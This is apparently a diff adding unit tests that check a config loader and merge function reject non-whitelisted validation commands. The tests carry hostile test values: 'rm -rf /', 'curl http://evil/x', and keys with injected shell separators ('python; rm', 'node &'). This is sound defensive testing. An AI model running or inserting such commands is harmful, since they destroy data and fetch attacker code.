@@ -1741,7 +1741,7 @@ class TestLoadPersonalizationFromConfig:
             "personalization": {
                 "extra_validation_commands": {
                     "python; rm": ["bad"],
-                    "safe_module": ["good"],
+                    "safe_module": ["pytest tests/"],
                     "node &": ["also bad"],
                 },
             },
@@ -1749,7 +1749,26 @@ class TestLoadPersonalizationFromConfig:
         data = load_personalization_from_config(config)
         assert "python; rm" not in data.extra_validation_commands
         assert "node &" not in data.extra_validation_commands
-        assert data.extra_validation_commands["safe_module"] == ["good"]
+        assert data.extra_validation_commands["safe_module"] == ["pytest tests/"]
+
+    def test_load_extra_validation_commands_rejects_unsafe_command(self) -> None:
+        """Config-sourced commands with non-whitelisted prefixes must be dropped
+        (ClawHub SDI-4): the strict-whitelist guarantee must hold even when
+        iterate.config.yaml is manually edited, not just during interactive entry.
+        """
+        config = {
+            "personalization": {
+                "extra_validation_commands": {
+                    "python": ["bandit -r src/", "rm -rf /", "curl http://evil/x"],
+                    "swift": ["swift build"],
+                },
+            },
+        }
+        data = load_personalization_from_config(config)
+        assert data.extra_validation_commands["python"] == ["bandit -r src/"]
+        assert "rm -rf /" not in data.extra_validation_commands["python"]
+        assert "curl http://evil/x" not in data.extra_validation_commands["python"]
+        assert data.extra_validation_commands["swift"] == ["swift build"]
 
 
 class TestLoadPersonalizationFromIterateMd:
@@ -1839,6 +1858,28 @@ class TestMergePersonalizationIntoConfig:
         assert "bandit -r src/" in result["validation"]["commands"]["python"]
         assert "pytest" in result["validation"]["commands"]["python"]
         assert result["validation"]["commands"]["swift"] == ["swift build"]
+
+    def test_merge_rejects_unsafe_command_and_does_not_whitelist(self) -> None:
+        """Merge must fail closed (ClawHub SDI-2): a non-whitelisted command
+        must not be copied into validation.commands nor auto-extend
+        command_whitelist, even if it reaches merge via a hand-built
+        PersonalizationData.
+        """
+        config = {
+            "validation": {
+                "commands": {"python": ["pytest"]},
+                "command_whitelist": ["pytest"],
+            },
+        }
+        data = PersonalizationData(
+            extra_validation_commands={"python": ["rm -rf /", "curl http://evil/x"]},
+        )
+        result = merge_personalization_into_config(config, data)
+        assert "rm -rf /" not in result["validation"]["commands"]["python"]
+        assert "curl http://evil/x" not in result["validation"]["commands"]["python"]
+        assert result["validation"]["commands"]["python"] == ["pytest"]
+        assert "rm" not in result["validation"]["command_whitelist"]
+        assert "curl" not in result["validation"]["command_whitelist"]
 
     def test_merge_extra_commands_no_duplicates(self) -> None:
         config = {
